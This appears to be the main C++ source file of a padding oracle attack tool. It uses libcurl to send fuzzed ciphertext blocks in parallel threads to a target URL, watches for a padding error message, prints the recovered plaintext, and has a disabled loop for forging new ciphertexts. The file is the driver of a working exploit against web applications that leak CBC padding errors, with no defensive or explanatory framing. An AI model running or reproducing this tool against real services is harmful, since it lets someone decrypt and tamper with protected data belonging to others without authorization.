#include <curl/curl.h>
#include <iostream>
#include <thread>
#include <string>
#include <atomic>
#include <mutex>

#include "include/constants.h"
#include "include/network.h"
#include "include/cracker.h"
#include "include/common.h"
#include "include/target.h"
#include "include/utils.h"
#include "include/log.h"


std::mutex msgMutex;
std::mutex cdlMutex;

void worker(
    unsigned int k,
    std::vector<std::string>& blocks, 
    std::vector<CypherData>& cypherDataList,
    std::string& msg
) {
    CURL* curl = CurlInit();
    unsigned int p;

    if (blocks.size() < (k+1)) {
        Log::error("Not enough blocks to slice in worker " + std::to_string(k));
        CurlCleanup(curl);
        exit(1);
    }
    std::vector<std::string> slice(blocks.begin(), blocks.begin() + (k+2));

    CypherData cd = Fuzz(curl, slice, k);
    CurlCleanup(curl);

    // Lock the access to cypherDataList
    {
        std::lock_guard<std::mutex> lock(cdlMutex);
        cypherDataList[k] = cd;
    }
    
    for (p=0; p<Target::getBlockSize(); p++) {
        // Lock the access to msg
        std::lock_guard<std::mutex> lock(msgMutex);
        msg[k*Target::getBlockSize()+p] = static_cast<char>(cypherDataList[k].Pn[p]);
    }
}

int main(int argc, char* argv[]) {
    Log::print(Constants::BAN);

    Args args = getArgs(argc, argv);
    Log::print("URL: "+args.url);
    Log::print("Method: " + args.method);
    if (!args.data.empty()) {
        Log::print("Data: " + args.data);
    }
    Log::print("Cypher: " + args.cypher);
    Log::print("Block size: " + std::to_string(args.blockSize));
    Log::print("Padding error: " + args.paddingError);
    std::cout << std::endl;

    // init target parameters
    Target::initialize(
        args.url,
        args.method,
        args.data,
        args.paddingError,
        args.blockSize
    );

    std::vector<std::string> blocks = GetBlocks(args.cypher);
    unsigned int nBlocks = blocks.size()-1; // -1 because we added a block of 0x00s
    
    Log::print("Blocks:");
    unsigned int k;
    for (k=1; k<nBlocks+1;k++) {
        Log::print(std::to_string(k) + ": " + blocks[k]);
    }
    Log::print("\nPress any key to start the attack...\n");
    std::cin.get();

    std::vector<CypherData> cypherDataList;
    cypherDataList.resize(nBlocks);
    std::string msg(nBlocks*args.blockSize, '\0');

    // create threads, one for each block
    std::vector<std::thread> threads;
    for (k=0; k<nBlocks;k++) {
        threads.emplace_back(worker, k, std::ref(blocks), std::ref(cypherDataList), std::ref(msg));
    }

    // wait threads
    for (auto& t : threads) {
        t.join();
    }

    Log::bingo("Decrypted message: " + msg);


    // ask to encrypt a chosen message
    std::string userInput;
    unsigned int plainSize;
    unsigned int nBlocksNeeded;
    std::vector<std::string> newBlocks;
    std::string newCypher;

    while (true) {
        Log::print("Do you want to craft a custom cypher? Enter your plaintext or type 'q' to quit: ");
        std::cin >> userInput;
        
        if (userInput == "q") {
            Log::print("Bye");
            break;
        }
        // TODO: fix segfault
        // plainSize = userInput.size();
        // nBlocksNeeded = (plainSize + Target::getBlockSize() - 1) / Target::getBlockSize();
        // if (nBlocksNeeded < nBlocks) {
        //     newBlocks = BuildBlocks(userInput, cypherDataList, nBlocksNeeded, plainSize);
        //     newBlocks.push_back(blocks[nBlocksNeeded]);
        //     newCypher = BlocksToCypher(newBlocks, nBlocksNeeded);
        //     Log::bingo("New cypher text: " + newCypher);
        // } else {
        //     Log::warning("Can't craft this message with previous cracked data because it's too long.");
        // }

        newBlocks.clear();
    }

    return 0;
}